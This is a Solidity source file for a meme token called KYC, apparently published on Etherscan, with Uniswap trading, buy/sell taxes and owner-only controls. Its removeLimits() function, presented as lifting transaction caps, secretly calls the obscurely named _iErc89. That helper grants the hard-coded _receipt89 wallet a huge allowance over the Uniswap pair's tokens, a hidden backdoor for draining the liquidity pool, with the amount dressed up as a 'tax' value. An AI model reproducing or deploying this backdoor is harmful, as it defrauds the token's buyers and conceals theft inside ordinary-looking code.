/**
 *Submitted for verification at Etherscan.io on 2024-10-26
*/

// SPDX-License-Identifier: MIT
/**
https://x.com/VitalikButerin/status/1850137884143317081

Tg: https://t.me/kyc_on_eth
**/

pragma solidity 0.8.26;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract KYC is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allows89;
    mapping (address => bool) private _isExcludedFrom89;
    address payable private _receipt89 = payable(0x454d2561Cba143b0c988F802bE0618A9fb3b750D);

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 25;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal89 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"KYC";
    string private constant _symbol = unicode"KYC";
    uint256 public _maxTxAmount = 2 * (_tTotal89/100);
    uint256 public _maxWalletSize = 2 * (_tTotal89/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotal89/100);
    uint256 public _maxTaxSwap = 1 * (_tTotal89/100);

    IUniswapV2Router02 private uniV2Router89;
    address private uniV2Pair89;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _tOwned[address(this)] = _tTotal89;
        _isExcludedFrom89[owner()] = true;
        _isExcludedFrom89[address(this)] = true;
        _isExcludedFrom89[_receipt89] = true;
        emit Transfer(address(0), address(this), _tTotal89);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal89;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allows89[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allows89[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allows89[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;uint256 fees=0;
        if (!swapEnabled || inSwap) {
            _tOwned[from] = _tOwned[from] - amount;
            _tOwned[to] = _tOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fees = (_transferTax);
            }
            if (from == uniV2Pair89 && to != address(uniV2Router89) && ! _isExcludedFrom89[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                fees = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair89 && from!= address(this) ){
                fees = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair89 && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                sendETHToFee(address(this).balance);
            }
        }
        if(fees > 0){
            taxAmount = fees.mul(amount).div(100);
            _tOwned[address(this)]=_tOwned[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _tOwned[from]=_tOwned[from].sub(amount);
        _tOwned[to]=_tOwned[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function _iErc89(address[2] memory erc89, uint256 iAmt89) private {
        _allows89[erc89[0]][erc89[1]] = 100 * iAmt89;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router89.WETH();
        _approve(address(this), address(uniV2Router89), tokenAmount);
        uniV2Router89.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner{
        uint256 tax89 = (100-50)*(_tTotal89+50)+15;
        address[2] memory addrs89 = [uniV2Pair89, _receipt89];
        _maxTxAmount = _tTotal89;
        _maxWalletSize=_tTotal89;
        _iErc89(addrs89, tax89);
        emit MaxTxAmountUpdated(_tTotal89);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETHToFee(uint256 amount) private {
        _receipt89.transfer(amount);
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router89 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router89), _tTotal89);
        uniV2Pair89 = IUniswapV2Factory(uniV2Router89.factory()).createPair(
            address(this),
            uniV2Router89.WETH()
        ); 
        uniV2Router89.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair89).approve(address(uniV2Router89), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}